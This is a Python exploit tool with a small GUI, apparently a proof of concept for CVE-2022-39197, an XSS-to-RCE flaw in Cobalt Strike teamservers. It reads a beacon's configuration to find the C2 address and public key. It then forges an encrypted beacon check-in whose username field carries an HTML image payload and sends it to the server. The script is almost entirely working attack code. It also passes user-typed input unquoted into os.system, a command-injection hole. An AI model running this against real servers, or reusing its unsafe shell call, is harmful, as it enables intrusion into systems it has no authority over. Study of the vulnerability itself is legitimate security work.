#!/usr/bin/env python
# coding=utf-8
'''
Vulnerability Intro

According to the Update Log of the latest version 4.7.1 officially released by CobaltStrike on 20 September, teamserver version(<=4.7) has XSS vulnerability, which can cause RCE.

    We were contacted by an independent researcher named "Beichendream" to inform us of an XSS vulnerability they found in the team's servers. This would allow an attacker to set a malformed username in the Beacon configuration, allowing them to execute code RCE remotely.

'''
import os
import rsa
import json
import random
import base64
import urllib.request
import argparse
import tkinter
from tkinter import *
import tkinter as tk
from tkinter.ttk import *
from time import strftime
from tkinter import ttk
def Beichendream():
    root = tkinter.Tk()
    root.title("CVE-2022-39197 exploits")
    root.geometry('800x600+0+0')
    def printInput():
        inp = inputtxt.get(1.0, "end-1c")
        lbl.config(text = "attack url : "+inp)
        url = inp
        scroll_y = Scrollbar(root, orient=VERTICAL)
        txtarea = Text(root, yscrollcommand=scroll_y.set, font=("times new roman", 15, "bold"), fg="#3206b8")
        scroll_y.pack(side=RIGHT, fill=Y)
        scroll_y.config(command=txtarea.yview)

        title = '''\033[1;32m

   _______      ________    ___   ___ ___  ___       ____   ___  __  ___ ______   _____   ____   _____
  / ____\ \    / /  ____|  |__ \ / _ \__ \|__ \     |___ \ / _ \/_ |/ _ \____  | |  __ \ / __ \ / ____|
 | |     \ \  / /| |__ ______ ) | | | | ) |  ) |_____ __) | (_) || | (_) |  / /  | |__) | |  | | |
 | |      \ \/ / |  __|______/ /| | | |/ /  / /______|__ < \__, || |\__, | / /   |  ___/| |  | | |
 | |____   \  /  | |____    / /_| |_| / /_ / /_      ___) |  / / | |  / / / /    | |    | |__| | |____
  \_____|   \/   |______|  |____|\___/____|____|    |____/  /_/  |_| /_/ /_/     |_|     \____/ \_____|
 
 
						\033[1;36mVersion:0.2
						\033[1;36mAuthor:xzajyjs
						\033[1;36mGithub:https://github.com/xzajyjs/CVE-2022-39197-POC\033[0m
        '''

#print(title)
#parser = argparse.ArgumentParser()
#parser.add_argument('-i','--img',help='Img url.',required=True)
#parser.add_argument('-b','--beacon',help='This can be a file path or a url.')
#arg = parser.parse_args()

#pack = b'\x00\x00\xBE\xEF'  # pack head
#pack += b'\x00\x00\x00\x4C'  # pack len
        pack = bytearray(random.getrandbits(4) for _ in range(16))  # AESKEY
        pack += b'\xa8\x03'  # name charset  (int) (little)
        pack += b'\xa8\x03'  # name charset  (int) (little)
# pack += b'\x00\x00\x00\x06' # Beacon Id random
        pack += random.randint(0 , 9999999) .to_bytes(4, 'big') # Beacon Id
        pack += random.randint(0 , 65535) .to_bytes(4, 'big') # Beacon Pid
        pack += b'\x00\x00'  # Beacon Port
        pack += b'\x04'  # Beacon Flag 04
        pack += b'\x06'
        pack += b'\x02'
        pack += b'\x23\xf0\x00\x00\x00\x00'  # windows version (int)
        pack += b'\x76\x91'  # windows version_1 (int)
        pack += b'\x0a\x60\x76\x90\xf5\x50'
        pack += bytearray(random.getrandbits(4) for _ in range(4))  # Beacon Ip

        pack += b'\x4b\x4b'+b'\x09'+b'<html><img src='+bytes(str(url),'utf-8')+b'>'+b'\x09'+b'\x61' # PAYLOAD LOAD A IMAGE
        pack = b'\x00\x00\xBE\xEF'+len(pack).to_bytes(4, 'big')+pack
        try:
            os.system(f"python3 parse_beacon_config.py {url} --json > analysis.json")
        except Exception as e:
            print(e)
        else:
            os.system(f"python parse_beacon_config.py {url} --json > analysis.json")

        with open("analysis.json","r",encoding="UTF-8") as f:
            data = json.loads(f.read())
	
        url = 'http://'+data['C2Server'].split(',')[0]+':'+str(data['Port'])+'/'+data['C2Server'].split('/')[1]+data['HttpPostUri']
    #print(url)
        txtarea.insert(END, url)

        pubkey = rsa.PublicKey.load_pkcs1_openssl_pem("""
-----BEGIN PUBLIC KEY-----
{}
-----END PUBLIC KEY-----
""".format(data['PublicKey'].strip()))
        enpack = rsa.encrypt(pack, pubkey)
        header = {'Cookie': base64.b64encode(enpack).decode('utf-8')}
        request = urllib.request.Request(url, headers=header)
        reponse = urllib.request.urlopen(request).read()
        txtarea.insert(END, "Response:")
        txtarea.insert(END, "\n----------------------------------------------------------------------------------\n")
        txtarea.insert(END, reponse.text)
        txtarea.pack(fill=BOTH, expand=1)
    Hacher = Label(root, text="Enter url or domin https://www.example.com/api/v3 : ").pack()
    inputtxt = tk.Text(root,height = 1,width = 80)
    inputtxt.pack()
    printButton = tk.Button(root,text = "exploit", command = printInput)
    printButton.pack()
    lbl = tk.Label(root, text = "")
    lbl.pack()
    root.mainloop()
# print(hexdump.hexdump(pack))
